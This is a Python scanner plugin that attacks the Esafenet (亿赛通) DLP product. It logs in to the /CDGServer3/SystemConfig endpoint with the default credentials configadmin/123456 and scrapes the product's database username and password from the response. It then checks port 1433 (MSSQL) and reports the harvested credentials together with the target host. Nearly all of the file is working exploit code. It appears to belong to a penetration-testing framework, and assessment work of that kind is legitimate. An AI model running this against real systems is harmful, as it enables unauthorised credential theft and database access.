#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'
import socket
import urllib.parse
import requests
from bs4 import BeautifulSoup
requests.packages.urllib3.disable_warnings()

'''
app="亿赛通DLP"
'''

def info(data=None):
    info = {
        "name": "yst_dlp",
        "info": "yst_dlp",
        "level": "high",
        "type": "info"
    }
    return info

def prove(data):
    data = init(data,'yst_dlp')
    if data['base_url']:
        sql_result  = None
        name = ''
        try:
            url = data['base_url'] + '/CDGServer3/help/getEditionInfo.jsp'
            r = curl('get',url)
            if r :
                res = r.text
                soup = BeautifulSoup(res,'html5lib')
                if '授权用户' in res:
                    name = soup.select('body > div:nth-of-type(2) > table > tbody > tr:nth-of-type(6) > td:nth-of-type(2) > input[type="text"]')
                else:
                    name = soup.select(
                        'body > div:nth-of-type(2) > table > tbody > tr:nth-of-type(5) > td:nth-of-type(2) > input[type="text"]')
                if len(name) > 0:
                    name = name[0]['value']
        except:
            name = ''

        try:
            url = data['base_url'] + '/CDGServer3/SystemConfig'
            _data = {'command':'Login','verifyCodeDigit':'dfd','name':'configadmin','pass':'123456'}
            r = curl('post',url,data = _data)
            if r :
                res = r.content
                soup = BeautifulSoup(res, 'html5lib')
                sql_user = soup.select('#est\\.connection\\.username')[0]['value']
                sql_pass = soup.select('#est\\.connection\\.password')[0]['value']
                sql_result = name+ '/' + sql_user + '/' + sql_pass
        except:
            sql_result = None
        if sql_result:
            if _socket_connect(data['target_host'],1433):
                sql_result = data['target_host'] + ":1433/" + sql_result
            data['flag'] = 1
            data['data'].append({"page": url})
            data['res'].append({"info": sql_result, "key": "configadmin/123456"})

    return data

def _socket_connect(ip, port,msg = "test"):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((ip, port))
        s.sendall(bytes(msg, 'utf-8'))
        # message = str(s.recv(1024))
        s.close()
        return True
    except:
        return False

if __name__=='__main__':
    from script import init, curl
    print(prove({'url':'http://www.baidu.com','flag':-1,'data':[],'res':[]}))